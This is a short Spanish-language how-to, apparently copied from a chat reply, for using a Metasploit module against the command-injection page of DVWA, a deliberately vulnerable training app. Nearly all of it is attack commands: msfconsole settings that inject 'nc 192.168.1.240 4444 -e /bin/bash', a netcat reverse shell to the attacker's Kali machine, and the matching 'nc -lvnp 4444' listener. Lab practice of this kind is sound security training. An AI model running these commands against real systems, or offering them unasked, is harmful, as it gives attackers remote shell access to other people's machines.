This module exploits a command injection vulnerability in DVWA's vulnerable "exec" module.
        It allows remote command execution via direct command injection, without using a payload.


**Configuración de opciones en msfconsole
bash
Copiar
Editar
use exploit/multi/http/dvwa_simple_cmd
set RHOSTS 192.168.1.230
set RPORT 80
set TARGETURI /digininja/vulnerabilities/exec/
set CMD nc 192.168.1.240 4444 -e /bin/bash
set SSL false
set VERBOSE true
exploit

🔊 Preparación del listener en otro terminal
Como el comando es una reverse shell usando netcat, antes de lanzar el exploit, asegúrate de tener un listener en tu máquina atacante (Kali):

bash
Copiar
Editar
nc -lvnp 4444
